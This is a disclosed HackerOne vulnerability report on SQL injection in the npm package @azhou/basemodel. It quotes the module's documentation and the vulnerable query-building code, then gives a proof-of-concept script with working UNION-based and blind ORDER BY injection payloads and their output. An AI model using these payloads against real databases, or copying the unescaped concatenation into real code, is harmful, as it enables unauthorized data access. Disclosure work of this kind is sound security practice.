# [@azhou/basemodel] SQL injection

## Report Details
- **Report ID**: 506644
- **URL**: https://hackerone.com/reports/506644
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-03-08T06:30:42.485Z
- **Disclosed**: 2020-02-02T23:00:07.219Z

## Reporter
- **Username**: verichains
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report SQL injection in @azhou/basemodel
It allows attacker to read data from database.

# Module

**module name:** @azhou/basemodel
**version:** 1.0.0
**npm page:** `https://www.npmjs.com/package/@azhou/basemodel`

## Module Description

### Usage

#### Initialization

```js
var model = require("@azhou/basemodel")(tableName, fields);
```
where `tableName` is the name of the data table and `fields` refers to the field list, either using comma connected string or array.

Example:
```js
// Initialize database
var db = require("@azhou/mysql-wrapper");
db.init("server", "database", "username", "password");

// Create basic CRUD data model
var model = require("@azhou/basemodel")("table", [ "field1", "field2", "field3", ... ]);
```

Notice when defining fields, `id` should not implicitly added and should not be contained in the field list

If validation is required, function `validate()` that returns boolean can be added to `model`:
```js
model.validate = function (source) { ... }
```

#### CRUD Functions

##### Create Object

```js
model.create(source)
```
* `source` is the source object

Example:
```js
model.create({ name: 'John Doe', value: 123.456 }).then(function (id) { ... });
```

##### Read Object by ID

```js
model.getById(id, fields)
```
* `fields` is optional, which is an array of field list you want to return in the result. If missing or incorrect type, default field list is used.

Examples:
```js
model.getById(123).then(function (obj) { ... });
model.getById(456, [ "name", "value" ]).then(function (obj) { ... });
```

##### Read Object by Name

```js
model.getByName(name, fields)
```
* `fields` is optional, which is an array of field list you want to return in the result. If missing or incorrect type, default field list is used.

##### Read All Objects

```js
model.getAll(fields, orderby)
```
* `fields` is optional, which is an array of field list you want to return in the result. If missing or incorrect type, default field list is used.

* `orderby` is an optional string argument which defines the ordering of the returned list.

Examples:
```js
model.getAll("name").then(function (list) { ... });
model.getAll([ "name", "value" ]).then(function (list) { ... });
model.getAll([ "name", "value" ], "name DESC").then(function (list) { ... });
```

##### Read Objects by ID list

There are four different of formats:

1. Read all objects whose `id` is in the `ids` list:

	```js
	model.getAllByIds(ids)
	```

2. Read all objects whose `id` is in the `ids` list, and returns the fields listed in `fields` array
	
	```js
	model.getAllByIds(ids, fields)
	```
3. Object array is provided, and the `id` is retrieved from field `nameOfIdField`

	```js
	model.getAllByIds(objects, nameOfIdField)
	```
4. Object array is provided, and the `id` is retrieved from field `nameOfIdField`. Field array is also provided

	```js
	model.getAllByIds(objects, nameOfIdField, fields)
	```

Examples:
```js
model.getAllByIds([ 1, 2, 3 ]).then(function (list) { ... });
model.getAllByIds([ 1, 2, 3 ], [ "name", "value" ]).then(function (list) { ... });
model.getAllByIds(objects, "id").then(function (list) { ... });
model.getAllByIds(objects, "id", [ "name", "value" ]).then(function (list) { ... });
```

##### Update Object
```js
model.update(id, source)
```
Example:
```js
model.update(123, { name: "Mike Smith" }).then(function () { ... });
```

##### Delete Object
```js
model.delete(id)
```

## Module Stats

8 downloads in the last month

# Vulnerability

## Vulnerability Description

- All table names and fields arguments of all methods are fed directly into query by string concatenation without escaping which may lead to sql injection.
- Order by field of `model.getAll(fields, orderby)` is not escaped and directly used in query which lead to blind sql injection:
```js
	model.getAll = function (fields, orderby) {
		if (typeof fields == 'string') {
			orderby = fields;
			fields = allFields;
		} else if (Array.isArray(fields) && (typeof orderby == 'string' || !orderby)) {
			if (fields.length == 0)
				fields = allFields;
		} else {
			fields = allFields;
			orderby = "";
		}

		return db.query("SELECT id," + fields.join(",") + " FROM `" + table + "`"
			+ (orderby ? " ORDER BY " + orderby : ""));
	}
```

## Steps To Reproduce:

Example POC:
```
var db = require("@azhou/mysql-wrapper");
db.init("localhost", "mysql", "root", "");

(async () => {
	await db.query("CREATE TABLE IF NOT EXISTS test(id int not null PRIMARY KEY AUTO_INCREMENT, ckey varchar(255), cvalue varchar(255));");
	await db.query("TRUNCATE TABLE test;");

	var model = require("@azhou/basemodel")("test", ["ckey","cvalue"]);
	
	for(var i=0;i<10;i++)
		await model.create({ckey: `k${i}`, cvalue: `v${i}`});
	
	console.log('- get all (normal)');
	console.log(await model.getAll(["ckey", "cvalue"]))

	console.log('- get all (sqli)');
	console.log(await model.getAll(["ckey", "cvalue from test where 1=0 union all select 0, 'sqli','sqli'#"]))

	console.log('- get all (bsqli in order by)');
	console.log(await model.getAll(["ckey", "cvalue"], 'IF(1=1, id, -id) LIMIT 1'))
	console.log(await model.getAll(["ckey", "cvalue"], 'IF(1=0, id, -id) LIMIT 1'))
})()
```

Output
```
- get all (normal)
[ RowDataPacket { id: 1, ckey: 'k0', cvalue: 'v0' },
  RowDataPacket { id: 2, ckey: 'k1', cvalue: 'v1' },
  RowDataPacket { id: 3, ckey: 'k2', cvalue: 'v2' },
  RowDataPacket { id: 4, ckey: 'k3', cvalue: 'v3' },
  RowDataPacket { id: 5, ckey: 'k4', cvalue: 'v4' },
  RowDataPacket { id: 6, ckey: 'k5', cvalue: 'v5' },
  RowDataPacket { id: 7, ckey: 'k6', cvalue: 'v6' },
  RowDataPacket { id: 8, ckey: 'k7', cvalue: 'v7' },
  RowDataPacket { id: 9, ckey: 'k8', cvalue: 'v8' },
  RowDataPacket { id: 10, ckey: 'k9', cvalue: 'v9' } ]
- get all (sqli)
[ RowDataPacket { id: 0, ckey: 'sqli', cvalue: 'sqli' } ]
- get all (bsqli in order by)
[ RowDataPacket { id: 1, ckey: 'k0', cvalue: 'v0' } ]
[ RowDataPacket { id: 10, ckey: 'k9', cvalue: 'v9' } ]
```

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- MacOS
- 8.12.0
- 6.4.1

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

Allow attackers to query database if they have access to orderBy variable and to perform any query type if have access to table or column variable.

## Attachments
No attachments
